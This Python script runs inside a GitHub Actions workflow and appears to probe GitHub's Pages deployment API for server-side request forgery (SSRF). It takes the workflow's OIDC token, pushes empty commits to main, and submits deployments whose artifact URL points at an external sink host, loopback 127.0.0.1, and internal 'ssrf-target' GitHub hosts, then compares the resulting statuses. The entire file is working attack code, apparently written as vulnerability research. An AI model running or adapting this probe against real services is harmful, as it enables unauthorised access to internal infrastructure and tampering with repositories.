import json, os, ssl, sys, time, urllib.request, urllib.error
RUN=os.environ.get("GITHUB_RUN_ID","0"); REPO=os.environ["GITHUB_REPOSITORY"]
ART=os.environ.get("ART_ID","").strip(); GH=os.environ["GH_TOKEN"]
SINK=os.environ.get("SINK","").rstrip("/"); SHA=os.environ["GITHUB_SHA"]; API="https://api.github.com"
def http(u,m="GET",b=None,t=30):
    r=urllib.request.Request(u,method=m,data=json.dumps(b).encode() if b is not None else None)
    r.add_header("Authorization",f"Bearer {GH}"); r.add_header("Accept","application/vnd.github+json")
    r.add_header("X-GitHub-Api-Version","2022-11-28")
    if b is not None: r.add_header("Content-Type","application/json")
    try:
        with urllib.request.urlopen(r,timeout=t,context=ssl.create_default_context()) as z:
            return z.status,z.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code,e.read().decode("utf-8","replace")
    except Exception as e: return -1,f"<{type(e).__name__}:{e}>"

def status_of(did):
    s,b=http(f"{API}/repos/{REPO}/pages/deployments/{did}")
    try: return json.loads(b).get("status","?")
    except Exception: return f"<{s}>"
def cancel(did):
    s,_=http(f"{API}/repos/{REPO}/pages/deployments/{did}/cancel","POST",{})
    return s
def settle(did, budget=70):
    """poll until the status stops changing or the budget runs out; return (final, trail)"""
    trail=[]; last=None; t0=time.time()
    while time.time()-t0 < budget:
        st=status_of(did)
        if st!=last: trail.append(f"{int(time.time()-t0)}s:{st}"); last=st
        if st and ("error" in st or "success" in st or "deployed" in st or "cancel" in st): break
        time.sleep(6)
    return last, " -> ".join(trail)
def mkcommit(tag):
    s,b=http(f"{API}/repos/{REPO}/git/ref/heads/main")
    try: parent=json.loads(b)["object"]["sha"]
    except Exception: return None
    s,b=http(f"{API}/repos/{REPO}/git/commits/{parent}")
    try: tree=json.loads(b)["tree"]["sha"]
    except Exception: return None
    s,b=http(f"{API}/repos/{REPO}/git/commits","POST",{"message":f"sep-{tag}-{RUN}","tree":tree,"parents":[parent]})
    try: new=json.loads(b)["sha"]
    except Exception: return None
    http(f"{API}/repos/{REPO}/git/refs/heads/main","PATCH",{"sha":new,"force":False})
    return new

print("=== ARMS4-START ===",flush=True)
try:
    r=urllib.request.Request(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"])
    r.add_header("Authorization",f"bearer {os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']}")
    with urllib.request.urlopen(r,timeout=30,context=ssl.create_default_context()) as z:
        TOK=json.loads(z.read().decode()).get("value","") or ""
    print(f"[oidc] token_len={len(TOK)} artifact_id={ART} sha={SHA[:12]}",flush=True)
    if len(TOK)<20 or not ART: print("🔴 ARMING GATE FAILED.",flush=True); sys.exit(0)

    GN="https://ssrf-target.iad.github.net"; GF="https://ssrf-target-qq7x4z.iad.github.net"
    #  tag        url (None = the artifact_id-only POSITIVE CONTROL)
    PLAN=[("CTRL_idonly", None),
          ("sink",   f"{SINK}/D-sink-{RUN}"),
          ("pub404", "https://httpbin.org/status/404"),
          ("nxdom",  f"https://zzq7x4z-nx-{RUN}.example.com/z.tar"),
          ("ghreal", f"{GN}/z-{RUN}.tar"),
          ("ghfake", f"{GF}/z-{RUN}.tar"),
          ("loop80", f"http://127.0.0.1:80/z-{RUN}.tar")]
    rows=[]
    for i,(tag,url) in enumerate(PLAN):
        bver = SHA if i==0 else mkcommit(tag)
        if not bver: rows.append((tag,"-","COMMIT-FAILED","","")); print(f"  {tag}: commit failed",flush=True); continue
        body={"pages_build_version":bver,"oidc_token":TOK,"artifact_id":int(ART)}
        if url: body["artifact_url"]=url
        s,b=http(f"{API}/repos/{REPO}/pages/deployments","POST",body)
        did=None
        try: did=json.loads(b).get("id")
        except Exception: pass
        msg=" ".join(b.split())[:100]
        if did:
            fin,trail=settle(did)
            cs=cancel(did)
            rows.append((tag,did,fin,trail,f"cancel={cs}"))
            print(f"  {tag:<12} POST {s} dep={did[:14]} FINAL={fin!r}  [{trail}]  cancel={cs}",flush=True)
        else:
            rows.append((tag,"-",f"POST-{s}",msg,""))
            print(f"  {tag:<12} POST {s} NO-DEPLOYMENT  {msg}",flush=True)
        time.sleep(3)

    ids=[r[1] for r in rows if r[1] not in ("-",None)]
    print(f"\n=== SEPARABILITY GATE: deployments={len(ids)} distinct={len(set(ids))} ===",flush=True)
    ctrl=[r for r in rows if r[0]=="CTRL_idonly"]
    ctrl_ok = bool(ctrl) and ctrl[0][1] not in ("-",None)
    if not ctrl_ok:
        print("🔴 VOID: the artifact_id-only POSITIVE CONTROL created no deployment. Nothing is attributable.",flush=True)
    elif len(ids)<3 or len(set(ids))!=len(ids):
        print("🔴 VOID: ids not distinct -- arms shared an object, same defect as run 38692481202.",flush=True)
    else:
        print("✅ SEPARABLE AND CONTROLLED. Per-destination FINAL statuses:",flush=True)
        for tag,did,fin,trail,extra in rows:
            print(f"     {tag:<12} {str(fin):<28} {trail}",flush=True)
        g=[r[2] for r in rows if r[0]=="ghreal"]; f=[r[2] for r in rows if r[0]=="ghfake"]
        if g and f:
            print(f"\n  ghreal={g[0]!r}  ghfake={f[0]!r}  ->  "
                  f"{'DIFFER' if g[0]!=f[0] else 'IDENTICAL'}",flush=True)
finally:
    print("=== ARMS4-END ===",flush=True)
